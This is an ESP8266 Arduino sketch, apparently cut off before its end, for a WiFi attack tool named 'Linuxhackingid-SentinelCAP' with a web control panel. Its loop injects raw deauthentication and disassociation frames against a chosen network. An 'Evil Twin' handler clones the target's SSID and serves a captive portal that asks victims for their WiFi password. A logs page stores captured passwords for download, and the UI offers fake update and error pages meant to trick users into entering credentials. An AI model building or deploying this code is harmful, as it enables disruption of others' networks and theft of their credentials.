#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <FS.h> // For SPIFFS/LittleFS
#include <ArduinoJson.h> // For handling JSON data (e.g., for logs, settings)

extern "C" {
#include "user_interface.h"
}

// --- Global Definitions ---
#define APP_NAME "Linuxhackingid-SentinelCAP"
#define AP_SSID "Linuxhackingid-SentinelCAP"
#define AP_PASSWORD "linuxh4ck1ng1d" // Default password for the admin AP
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // IP for the admin AP and DNS server

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- Network Structures ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
} _Network;

_Network _networks[16]; // Max 16 networks for scan
_Network _selectedNetwork; // Currently selected target network

// --- Global State Variables ---
String _correctPasswordLog = ""; // Stores successfully captured passwords
String _tryPassword = ""; // Stores the password attempt from captive portal
bool hotspot_active = false; // Status of Evil Twin hotspot
bool deauthing_active = false; // Status of deauthentication attack
unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastWifiStatusCheck = 0;

// --- Function Prototypes ---
void setup();
void loop();
void clearNetworkArray();
void performScan();
String bytesToStr(const uint8_t* b, uint32_t size);

// Web UI Handlers
void handleRoot();
void handleScan();
void handleAttack();
void handleCaptivePortalConfig();
void handleLogs();
void handleSettings();
void handleAdminPanel();
void handleNotFound();
void handleFileManagement();
void handleFileUpload();
void handleFileDelete();
void handleCaptivePortal(); // For the actual captive portal page
void handleCaptivePortalSubmit(); // For handling password submission on captive portal
void handleRestart();

// Helper functions for Web UI
String getHeader(const String& title);
String getFooter();
String getNavigation(const String& activeTab);
String getStatusMonitor();
String getNetworkTableHTML();
String getFileTableHTML();
String getDeviceInfoHTML();

// --- Setup Function ---
void setup() {
  Serial.begin(115200);
  Serial.println("\n[INFO] Starting " + String(APP_NAME));

  // Initialize SPIFFS/LittleFS
  if (!SPIFFS.begin()) {
    Serial.println("[ERROR] An Error Occurred while mounting SPIFFS");
    return;
  }
  Serial.println("[INFO] SPIFFS mounted successfully");

  // Configure WiFi in AP_STA mode (for admin AP and scanning)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASSWORD);
  Serial.print("[INFO] Admin AP '" + String(AP_SSID) + "' started with IP: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS server for captive portal redirection
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[INFO] DNS Server started.");

  // Enable promiscuous mode for deauthentication (requires user_interface.h)
  wifi_promiscuous_enable(1);

  // --- Web Server Routes ---
  webServer.on("/", handleRoot);
  webServer.on("/scan", handleScan);
  webServer.on("/attack", handleAttack);
  webServer.on("/captiveportalconfig", handleCaptivePortalConfig);
  webServer.on("/logs", handleLogs);
  webServer.on("/settings", handleSettings);
  webServer.on("/admin", handleAdminPanel); // Main admin panel
  webServer.on("/restart", handleRestart);

  // File Management
  webServer.on("/filemanager", handleFileManagement);
  webServer.on("/upload", HTTP_POST, []() { webServer.send(200, "text/plain", ""); }, handleFileUpload);
  webServer.on("/deletefile", handleFileDelete);

  // Captive Portal (for clients connecting to the Evil Twin)
  webServer.on("/generate_captive_portal", handleCaptivePortal); // This will serve the dynamic captive portal
  webServer.on("/submit_password", HTTP_POST, handleCaptivePortalSubmit); // Handles password submission

  // Catch-all for unknown paths (redirect to captive portal if hotspot is active)
  webServer.onNotFound(handleNotFound);

  webServer.begin();
  Serial.println("[INFO] HTTP server started.");

  // Initial scan
  performScan();
}

// --- Loop Function ---
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauthentication attack logic
  if (deauthing_active && _selectedNetwork.ssid != "" && millis() - lastDeauthTime >= 1000) {
    Serial.println("[DEAUTH] Sending deauth packets to " + _selectedNetwork.ssid);
    wifi_set_channel(_selectedNetwork.ch);

    // Deauth packet structure (simplified for example)
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    // Target BSSID (AP)
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    // Source BSSID (AP)
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1; // Reason code (unspecified reason)

    // Send deauth from AP to client (broadcast)
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    // Send deauth from client to AP (broadcast)
    deauthPacket[0] = 0xA0; // Disassociation frame
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    lastDeauthTime = millis();
  }

  // Periodically scan for networks (every 15 seconds)
  if (millis() - lastScanTime >= 15000) {
    performScan();
    lastScanTime = millis();
  }

  // Periodically check WiFi status (every 2 seconds)
  if (millis() - lastWifiStatusCheck >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      // Serial.println("[INFO] WiFi not connected to any AP.");
    } else {
      // Serial.println("[INFO] WiFi connected to AP: " + WiFi.SSID());
    }
    lastWifiStatusCheck = millis();
  }
}

// --- Helper Functions ---

void clearNetworkArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = {"", 0, {0, 0, 0, 0, 0, 0}, 0}; // Reset network struct
  }
}

void performScan() {
  Serial.println("[SCAN] Starting WiFi scan...");
  int n = WiFi.scanNetworks();
  clearNetworkArray();
  if (n > 0) {
    Serial.print("[SCAN] Found ");
    Serial.print(n);
    Serial.println(" networks.");
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      _networks[i] = network;
      Serial.printf("[SCAN] %d: %s, Ch: %d, RSSI: %d, BSSID: %s\n", i + 1, network.ssid.c_str(), network.ch, network.rssi, bytesToStr(network.bssid, 6).c_str());
    }
  } else {
    Serial.println("[SCAN] No networks found.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

// --- Web UI Handlers ---

String getHeader(const String& title) {
  String html = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>" + String(APP_NAME) + " - " + title + "</title>";
  html += "<style>";
  html += "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 0; padding: 0; }";
  html += ".container { max-width: 1200px; margin: 20px auto; padding: 20px; background-color: #2a2a2a; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); }";
  html += "header { background-color: #0056b3; padding: 15px 20px; border-radius: 8px 8px 0 0; display: flex; justify-content: space-between; align-items: center; }";
  html += "header h1 { margin: 0; font-size: 1.8em; color: #fff; }";
  html += "header .logo { font-weight: bold; color: #fff; font-size: 1.2em; }";
  html += "nav { background-color: #333; padding: 10px 0; border-radius: 0 0 8px 8px; margin-bottom: 20px; }";
  html += "nav ul { list-style: none; padding: 0; margin: 0; display: flex; justify-content: center; }";
  html += "nav ul li { margin: 0 15px; }";
  html += "nav ul li a { color: #fff; text-decoration: none; padding: 8px 12px; border-radius: 5px; transition: background-color 0.3s ease; }";
  html += "nav ul li a:hover, nav ul li a.active { background-color: #007bff; }";
  html += "h2 { color: #007bff; border-bottom: 2px solid #007bff; padding-bottom: 10px; margin-top: 20px; }";
  html += "table { width: 100%; border-collapse: collapse; margin-top: 15px; }";
  html += "th, td { border: 1px solid #444; padding: 10px; text-align: left; }";
  html += "th { background-color: #333; color: #fff; }";
  html += "tr:nth-child(even) { background-color: #3a3a3a; }";
  html += "tr:hover { background-color: #4a4a4a; }";
  html += "button, input[type='submit'], .btn { background-color: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; transition: background-color 0.3s ease; margin-right: 5px; }";
  html += "button:hover, input[type='submit']:hover, .btn:hover { background-color: #0056b3; }";
  html += "input[type='text'], input[type='password'], textarea { width: calc(100% - 22px); padding: 10px; margin-top: 5px; margin-bottom: 10px; border: 1px solid #555; border-radius: 5px; background-color: #333; color: #e0e0e0; }";
  html += "select { padding: 8px; border-radius: 5px; background-color: #333; color: #e0e0e0; border: 1px solid #555; }";
  html += ".status-box { background-color: #333; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 15px; justify-content: space-around; }";
  html += ".status-item { flex: 1; min-width: 150px; text-align: center; padding: 10px; border: 1px solid #555; border-radius: 5px; }";
  html += ".status-item strong { display: block; font-size: 1.1em; margin-bottom: 5px; }";
  html += ".status-item .value { font-size: 1.2em; font-weight: bold; }";
  html += ".status-item .icon { font-size: 1.5em; margin-right: 5px; }";
  html += ".status-active { color: #28a745; } .status-inactive { color: #dc3545; }";
  html += ".log-entry { background-color: #333; padding: 10px; border-radius: 5px; margin-bottom: 8px; word-wrap: break-word; }";
  html += ".form-group { margin-bottom: 15px; } label { display: block; margin-bottom: 5px; color: #bbb; }";
  html += ".alert { padding: 10px; border-radius: 5px; margin-bottom: 15px; }";
  html += ".alert-success { background-color: #28a745; color: white; }";
  html += ".alert-error { background-color: #dc3545; color: white; }";
  html += ".file-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #444; }";
  html += ".file-item:last-child { border-bottom: none; }";
  html += ".file-item .actions button { margin-left: 5px; padding: 5px 10px; font-size: 0.9em; }";
  html += ".file-upload-form { border: 2px dashed #555; padding: 20px; text-align: center; margin-top: 20px; border-radius: 8px; }";
  html += ".file-upload-form input[type='file'] { display: none; }";
  html += ".file-upload-form label { background-color: #007bff; color: white; padding: 10px 15px; border-radius: 5px; cursor: pointer; display: inline-block; margin-top: 10px; }";
  html += ".file-upload-form label:hover { background-color: #0056b3; }";
  html += ".file-upload-form p { margin-top: 15px; color: #bbb; }";
  html += "@media (max-width: 768px) { nav ul { flex-direction: column; align-items: center; } nav ul li { margin: 5px 0; } .status-box { flex-direction: column; } }";
  html += "</style>";
  html += "</head><body>";
  html += "<header><div class='logo'>" + String(APP_NAME) + "</div><h1>" + title + "</h1></header>";
  html += getNavigation(title);
  html += "<div class='container'>";
  html += getStatusMonitor(); // Add status monitor to all pages
  return html;
}

String getFooter() {
  String html = "</div><footer><p style='text-align: center; margin-top: 30px; padding: 15px; background-color: #333; color: #bbb; border-radius: 0 0 8px 8px;'>&copy; 2023 " + String(APP_NAME) + " by Linuxhackingid. All rights reserved.</p></footer>";
  html += "<script>";
  html += "function post(path, params, method='post') {";
  html += "  const form = document.createElement('form');";
  html += "  form.method = method;";
  html += "  form.action = path;";
  html += "  for (const key in params) {";
  html += "    if (params.hasOwnProperty(key)) {";
  html += "      const hiddenField = document.createElement('input');";
  html += "      hiddenField.type = 'hidden';";
  html += "      hiddenField.name = key;";
  html += "      hiddenField.value = params[key];";
  html += "      form.appendChild(hiddenField);";
  html += "    }";
  html += "  }";
  html += "  document.body.appendChild(form);";
  html += "  form.submit();";
  html += "}";
  html += "</script>";
  html += "</body></html>";
  return html;
}

String getNavigation(const String& activeTab) {
  String html = "<nav><ul>";
  html += "<li><a href='/admin' class='" + (activeTab == "Admin Panel" ? String("active") : String("")) + "'>Admin Panel</a></li>";
  html += "<li><a href='/scan' class='" + (activeTab == "WiFi Scanner" ? String("active") : String("")) + "'>Scan</a></li>";
  html += "<li><a href='/attack' class='" + (activeTab == "Attack Controller" ? String("active") : String("")) + "'>Attack</a></li>";
  html += "<li><a href='/captiveportalconfig' class='" + (activeTab == "Captive Portal Config" ? String("active") : String("")) + "'>Captive Portal</a></li>";
  html += "<li><a href='/filemanager' class='" + (activeTab == "File Manager" ? String("active") : String("")) + "'>File Manager</a></li>";
  html += "<li><a href='/logs' class='" + (activeTab == "Logs Viewer" ? String("active") : String("")) + "'>Logs</a></li>";
  html += "<li><a href='/settings' class='" + (activeTab == "Settings" ? String("active") : String("")) + "'>Settings</a></li>";
  html += "</ul></nav>";
  return html;
}


String getStatusMonitor() {
  String html = "<div class='status-box'>";
  html += "<div class='status-item'><strong>Target SSID:</strong> <span class='value'>" + (_selectedNetwork.ssid == "" ? String("N/A") : _selectedNetwork.ssid) + "</span></div>";
  html += "<div class='status-item'><strong>Channel:</strong> <span class='value'>" + (String(_selectedNetwork.ch == 0 ? "N/A" : String(_selectedNetwork.ch))) + "</span></div>";
  html += "<div class='status-item'><strong>Hotspot:</strong> <span class='value " + (hotspot_active ? String("status-active'>&#10003; Active") : String("status-inactive'>&#10007; Inactive")) + "</span></div>";
  html += "<div class='status-item'><strong>Deauth:</strong> <span class='value " + (deauthing_active ? String("status-active'>&#10003; Active") : String("status-inactive'>&#10007; Inactive")) + "</span></div>";
  html += "<div class='status-item'><strong>WiFi Status:</strong> <span class='value " + (WiFi.status() == WL_CONNECTED ? String("status-active'>&#10003; Connected") : String("status-inactive'>&#10007; Disconnected")) + "</span></div>";
  html += "</div>";
  return html;
}


String getNetworkTableHTML() {
  String html = "<table><thead><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Select</th></tr></thead><tbody>";
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    html += "<tr>";
    html += "<td>" + _networks[i].ssid + "</td>";
    html += "<td>" + bytesToStr(_networks[i].bssid, 6) + "</td>";
    html += "<td>" + String(_networks[i].ch) + "</td>";
    html += "<td>" + String(_networks[i].rssi) + "</td>";
    html += "<td><button onclick=\"post('/scan', {action: 'select', bssid: '" + bytesToStr(_networks[i].bssid, 6) + "'})\" " + (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6) ? "style='background-color: #28a745;'" : "") + ">" + (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6) ? "Selected" : "Select") + "</button></td>";
    html += "</tr>";
  }
  html += "</tbody></table>";
  return html;
}

String getFileTableHTML() {
  String html = "<h2>Local Files (SPIFFS)</h2>";
  html += "<div style='max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; border-radius: 5px;'>";
  Dir dir = SPIFFS.openDir("/");
  if (!dir.next()) {
    html += "<p>No files found.</p>";
  } else {
    do {
      String fileName = dir.fileName();
      size_t fileSize = dir.fileSize();
      html += "<div class='file-item'>";
      html += "<span>" + fileName + " (" + String(fileSize) + " bytes)</span>";
      html += "<div class='actions'>";
      // Add preview for HTML/CSS/JS files (simple link, actual preview needs more logic)
      if (fileName.endsWith(".html") || fileName.endsWith(".css") || fileName.endsWith(".js")) {
        html += "<a href='" + fileName + "' target='_blank' class='btn' style='background-color: #ffc107;'>Preview</a>";
      }
      html += "<button style='background-color: #dc3545;' onclick=\"if(confirm('Are you sure you want to delete " + fileName + "?')) { post('/deletefile', {filename: '" + fileName + "'}); }\">Delete</button>";
      html += "</div></div>";
    } while (dir.next());
  }
  html += "</div>";
  html += "<div class='file-upload-form'>";
  html += "<form method='POST' action='/upload' enctype='multipart/form-data'>";
  html += "<input type='file' name='uploadFile' id='uploadFile' onchange='document.getElementById(\"fileNameDisplay\").innerText = this.files[0].name;'>";
  html += "<label for='uploadFile'>Choose File</label>";
  html += "<p id='fileNameDisplay'>No file chosen</p>";
  html += "<input type='submit' value='Upload File'>";
  html += "</form>";
  html += "</div>";
  return html;
}

String getDeviceInfoHTML() {
  String html = "<h2>Device Information</h2>";
  html += "<table>";
  html += "<tr><th>Parameter</th><th>Value</th></tr>";
  html += "<tr><td>IP Address (AP)</td><td>" + WiFi.softAPIP().toString() + "</td></tr>";
  html += "<tr><td>MAC Address (AP)</td><td>" + WiFi.softAPmacAddress() + "</td></tr>";
  html += "<tr><td>Uptime</td><td>" + String(millis() / 1000 / 60) + " minutes</td></tr>";
  html += "<tr><td>Free Heap Memory</td><td>" + String(ESP.getFreeHeap()) + " bytes</td></tr>";
  html += "<tr><td>Flash Size</td><td>" + String(ESP.getFlashChipSize() / 1024) + " KB</td></tr>";
  html += "<tr><td>Sketch Size</td><td>" + String(ESP.getSketchSize() / 1024) + " KB</td></tr>";
  html += "</table>";
  html += "<button style='background-color: #ffc107; margin-top: 20px;' onclick=\"if(confirm('Are you sure you want to restart the device?')) { post('/restart'); }\">Restart Device</button>";
  return html;
}


void handleRoot() {
  webServer.sendHeader("Location", "/admin", true);
  webServer.send(302, "text/plain", "");
}

void handleAdminPanel() {
  String html = getHeader("Admin Panel");
  html += "<h2>Welcome to " + String(APP_NAME) + "</h2>";
  html += "<p>This is your offline penetration testing tool for WiFi networks.</p>";
  html += getDeviceInfoHTML();
  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleScan() {
  if (webServer.hasArg("action") && webServer.arg("action") == "select") {
    String bssidStr = webServer.arg("bssid");
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        Serial.println("[INFO] Selected network: " + _selectedNetwork.ssid);
        break;
      }
    }
    // Redirect back to scan page to refresh
    webServer.sendHeader("Location", "/scan", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = getHeader("WiFi Scanner");
  html += "<h2>Available Networks</h2>";
  html += "<button onclick=\"post('/scan', {action: 'rescan'})\">Rescan Networks</button>";
  html += getNetworkTableHTML();
  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleAttack() {
  if (webServer.hasArg("action")) {
    String action = webServer.arg("action");
    if (action == "toggle_deauth") {
      if (_selectedNetwork.ssid != "") {
        deauthing_active = !deauthing_active;
        Serial.println("[INFO] Deauthentication " + String(deauthing_active ? "started" : "stopped") + " for " + _selectedNetwork.ssid);
      } else {
        Serial.println("[WARNING] Cannot toggle deauth: No network selected.");
      }
    } else if (action == "toggle_hotspot") {
      if (_selectedNetwork.ssid != "") {
        hotspot_active = !hotspot_active;
        if (hotspot_active) {
          // Stop admin AP and start Evil Twin AP
          dnsServer.stop();
          WiFi.softAPdisconnect(true); // Disconnect current AP
          WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
          WiFi.softAP(_selectedNetwork.ssid.c_str()); // Start AP with target SSID
          dnsServer.start(DNS_PORT, "*", apIP); // Restart DNS for Evil Twin
          Serial.println("[INFO] Evil Twin hotspot started for: " + _selectedNetwork.ssid);
        } else {
          // Stop Evil Twin AP and restart admin AP
          dnsServer.stop();
          WiFi.softAPdisconnect(true);
          WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
          WiFi.softAP(AP_SSID, AP_PASSWORD); // Restart admin AP
          dnsServer.start(DNS_PORT, "*", apIP);
          Serial.println("[INFO] Evil Twin hotspot stopped. Admin AP restarted.");
        }
      } else {
        Serial.println("[WARNING] Cannot toggle hotspot: No network selected.");
      }
    } else if (action == "spoof_ssids") {
      // Placeholder for SSID Spoofing Massal
      String ssidList = webServer.arg("ssid_list");
      Serial.println("[INFO] Mass SSID Spoofing requested with list:\n" + ssidList);
      // Implement logic to create multiple fake APs here
      // This is complex and requires careful management of WiFi.softAP() calls
      // and potentially multiple ESP8266 instances or advanced packet injection.
      // For a single ESP, you might cycle through SSIDs or use raw packets.
    }
    // Redirect back to attack page to refresh
    webServer.sendHeader("Location", "/attack", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = getHeader("Attack Controller");
  html += "<h2>Attack Options</h2>";

  if (_selectedNetwork.ssid == "") {
    html += "<p class='alert alert-error'>Please select a target network from the <a href='/scan'>WiFi Scanner</a> page first.</p>";
  } else {
    html += "<p>Currently selected target: <strong>" + _selectedNetwork.ssid + "</strong> (BSSID: " + bytesToStr(_selectedNetwork.bssid, 6) + ", Channel: " + String(_selectedNetwork.ch) + ")</p>";

    // Deauthentication Attack
    html += "<h3>Deauthentication Attack</h3>";
    html += "<button onclick=\"post('/attack', {action: 'toggle_deauth'})\" style='background-color: " + (deauthing_active ? String("#dc3545") : String("#28a745")) + ";'>" + (deauthing_active ? String("Stop Deauth") : String("Start Deauth")) + "</button>";
    html += "<p>Sends deauthentication packets to disconnect clients from the target network.</p>";

    // Evil Twin Generator
    html += "<h3>Evil Twin Hotspot</h3>";
    html += "<button onclick=\"post('/attack', {action: 'toggle_hotspot'})\" style='background-color: " + (hotspot_active ? String("#dc3545") : String("#28a745")) + ";'>" + (hotspot_active ? String("Stop Evil Twin") : String("Start Evil Twin")) + "</button>";
    html += "<p>Creates a fake access point with the same SSID and channel as the target, to lure victims.</p>";

    // SSID Spoofing Massal (Placeholder)
    html += "<h3>Mass SSID Spoofing (Advanced)</h3>";
    html += "<form onsubmit=\"post('/attack', {action: 'spoof_ssids', ssid_list: document.getElementById('ssid_list').value}); return false;\">";
    html += "<label for='ssid_list'>Enter SSIDs (one per line):</label>";
    html += "<textarea id='ssid_list' rows='5' placeholder='Fake_AP_1\nFree_WiFi\nPublic_Hotspot'></textarea>";
    html += "<input type='submit' value='Start Mass Spoofing'>";
    html += "</form>";
    html += "<p>Broadcasts multiple fake SSIDs simultaneously. (Requires advanced implementation)</p>";
  }

  html += getFooter();
  webServer.send(200, "text/html", html);
}


void handleCaptivePortalConfig() {
  if (webServer.hasArg("action")) {
    String action = webServer.arg("action");
    if (action == "set_template") {
      // In a real scenario, you'd save the selected template name to SPIFFS
      // and load it dynamically when the captive portal is requested.
      String templateName = webServer.arg("template_name");
      Serial.println("[INFO] Captive Portal template set to: " + templateName);
      // For now, just acknowledge.
    } else if (action == "generate_fake_page") {
      // Placeholder for Fake Update/Error Page Generator
      String pageType = webServer.arg("page_type");
      Serial.println("[INFO] Generating fake page of type: " + pageType);
      // Logic to generate and serve a fake update/error page
      // This would involve loading a specific HTML template from SPIFFS
      // and potentially injecting dynamic content.
    }
    webServer.sendHeader("Location", "/captiveportalconfig", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = getHeader("Captive Portal Config");
  html += "<h2>Custom Captive Portal & Fake Pages</h2>";

  html += "<h3>Captive Portal Template Selection</h3>";
  html += "<p>Select or upload HTML templates for your captive portal. The selected template will be served when Evil Twin is active.</p>";
  html += "<form onsubmit=\"post('/captiveportalconfig', {action: 'set_template', template_name: document.getElementById('template_select').value}); return false;\">";
  html += "<label for='template_select'>Choose Template:</label>";
  html += "<select id='template_select'>";
  // List HTML files from SPIFFS here
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String fileName = dir.fileName();
    if (fileName.endsWith(".html")) {
      html += "<option value='" + fileName + "'>" + fileName + "</option>";
    }
  }
  html += "</select>";
  html += "<input type='submit' value='Set Template'>";
  html += "</form>";
  html += "<p><i>(Ensure your chosen template has an input field named 'password' for sniffing.)</i></p>";

  html += "<h3>Fake Update/Error Page Generator</h3>";
  html += "<p>Generate convincing fake pages to trick users into entering credentials.</p>";
  html += "<form onsubmit=\"post('/captiveportalconfig', {action: 'generate_fake_page', page_type: document.getElementById('fake_page_type').value}); return false;\">";
  html += "<label for='fake_page_type'>Page Type:</label>";
  html += "<select id='fake_page_type'>";
  html += "<option value='firmware_update'>Firmware Update Failed</option>";
  html += "<option value='router_error'>Router Error</option>";
  html += "<option value='network_issue'>Network Issue</option>";
  html += "</select>";
  html += "<input type='submit' value='Generate Page'>";
  html += "</form>";
  html += "<p><i>(This feature requires specific HTML templates for each page type.)</i></p>";

  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleLogs() {
  if (webServer.hasArg("action")) {
    String action = webServer.arg("action");
    if (action == "clear_logs") {
      _correctPasswordLog = "";
      Serial.println("[INFO] Password logs cleared.");
    } else if (action == "download_logs") {
      // Implement actual file download
      webServer.sendHeader("Content-Disposition", "attachment; filename=password_log.txt");
      webServer.send(200, "text/plain", _correctPasswordLog);
      return; // Exit to prevent sending HTML again
    }
    webServer.sendHeader("Location", "/logs", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = getHeader("Logs Viewer");
  html += "<h2>Captured Passwords & Activity Logs</h2>";

  html += "<h3>Password Log</h3>";
  if (_correctPasswordLog == "") {
    html += "<p>No passwords captured yet.</p>";
  } else {
    html += "<div style='max-height: 300px; overflow-y: scroll; background-color: #333; padding: 10px; border-radius: 5px;'>";
    html += "<pre style='white-space: pre-wrap; word-wrap: break-word;'>" + _correctPasswordLog + "</pre>";
    html += "</div>";
  }
  html += "<button onclick=\"post('/logs', {action: 'clear_logs'})\" style='background-color: #dc3545;'>Clear Password Log</button>";
  html += "<button onclick=\"post('/logs', {action: 'download_logs'})\" style='background-color: #007bff;'>Download Password Log</button>";

  html += "<h3>System Activity Log (Serial Monitor Output)</h3>";
  html += "<p>For detailed system logs, please refer to the Serial Monitor.</p>";
  // You could potentially capture Serial.print output to a buffer and display here,
  // but it consumes significant memory on ESP8266.

  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleSettings() {
  if (webServer.hasArg("action")) {
    String action = webServer.arg("action");
    if (action == "set_admin_ap_password") {
      String newPass = webServer.arg("new_password");
      if (newPass.length() >= 8) {
        // In a real system, you'd save this to EEPROM/SPIFFS and restart
        // For this example, we'll just print it.
        Serial.println("[INFO] Admin AP password change requested to: " + newPass);
        // WiFi.softAP(AP_SSID, newPass.c_str()); // This would change it immediately
        // You'd need to store newPass in a global variable or config file
        // and apply it on next boot.
        webServer.send(200, "text/html", getHeader("Settings") + "<p class='alert alert-success'>Password change requested. Apply on next restart.</p>" + getFooter());
      } else {
        webServer.send(200, "text/html", getHeader("Settings") + "<p class='alert alert-error'>Password must be at least 8 characters.</p>" + getFooter());
      }
      return;
    }
    webServer.sendHeader("Location", "/settings", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String html = getHeader("Settings");
  html += "<h2>System Settings</h2>";

  html += "<h3>Admin AP Password</h3>";
  html += "<form onsubmit=\"post('/settings', {action: 'set_admin_ap_password', new_password: document.getElementById('new_admin_pass').value}); return false;\">";
  html += "<label for='new_admin_pass'>New Admin AP Password (min 8 chars):</label>";
  html += "<input type='password' id='new_admin_pass' name='new_password' minlength='8' required>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form>";
  html += "<p><i>(Changes will take effect after device restart.)</i></p>";

  html += "<h3>Channel Hopping (Automatic)</h3>";
  html += "<p>This feature is currently not implemented in the UI. The device scans all channels periodically for networks.</p>";
  // To implement: add a toggle for channel hopping, and modify performScan()
  // to cycle through channels if enabled.

  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleFileManagement() {
  String html = getHeader("File Manager");
  html += getFileTableHTML();
  html += getFooter();
  webServer.send(200, "text/html", html);
}

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    Serial.print("[FILE] Uploading: "); Serial.println(filename);
    webServer.send(200, "text/plain", "Uploading: " + filename);
    SPIFFS.remove(filename); // Remove existing file
    File uploadFile = SPIFFS.open(filename, "w");
    if (!uploadFile) {
      Serial.println("[ERROR] Failed to open file for writing");
      webServer.send(500, "text/plain", "Failed to open file for writing");
      return;
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    Serial.print(".");
    File uploadFile = SPIFFS.open(upload.filename, "a");
    if (uploadFile) {
      uploadFile.write(upload.buf, upload.currentSize);
      uploadFile.close();
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    Serial.println("\n[FILE] Upload complete: " + upload.filename + ", size: " + String(upload.totalSize));
    webServer.sendHeader("Location", "/filemanager", true);
    webServer.send(302, "text/plain", "");
  }
}

void handleFileDelete() {
  if (webServer.hasArg("filename")) {
    String filename = webServer.arg("filename");
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (SPIFFS.exists(filename)) {
      SPIFFS.remove(filename);
      Serial.println("[FILE] Deleted: " + filename);
    } else {
      Serial.println("[WARNING] File not found for deletion: " + filename);
    }
  }
  webServer.sendHeader("Location", "/filemanager", true);
  webServer.send(302, "text/plain", "");
}

void handleCaptivePortal() {
  // This function serves the actual captive portal page to clients
  // when the Evil Twin is active.
  if (!hotspot_active) {
    webServer.sendHeader("Location", "/admin", true); // Redirect if Evil Twin not active
    webServer.send(302, "text/plain", "");
    return;
  }

  // For demonstration, load a simple captive portal template.
  // In a real scenario, you'd load the dynamically selected template.
  String captivePortalHTML = "";
  File file = SPIFFS.open("/captive_portal_template.html", "r");
  if (file) {
    captivePortalHTML = file.readString();
    file.close();
    // Replace placeholders like {SSID} with actual selected SSID
    captivePortalHTML.replace("{SSID}", _selectedNetwork.ssid);
    // You can add more placeholders for branding, messages, etc.
  } else {
    Serial.println("[ERROR] captive_portal_template.html not found!");
    captivePortalHTML = "<!DOCTYPE html><html><head><title>Login to WiFi</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
    captivePortalHTML += "<center><h1>Welcome to " + _selectedNetwork.ssid + "</h1>";
    captivePortalHTML += "<p>Please enter your WiFi password to continue.</p>";
    captivePortalHTML += "<form action='/submit_password' method='post'>";
    captivePortalHTML += "<input type='password' name='password' placeholder='WiFi Password' required><br>";
    captivePortalHTML += "<input type='submit' value='Connect'>";
    captivePortalHTML += "</form></center></body></html>";
  }
  webServer.send(200, "text/html", captivePortalHTML);
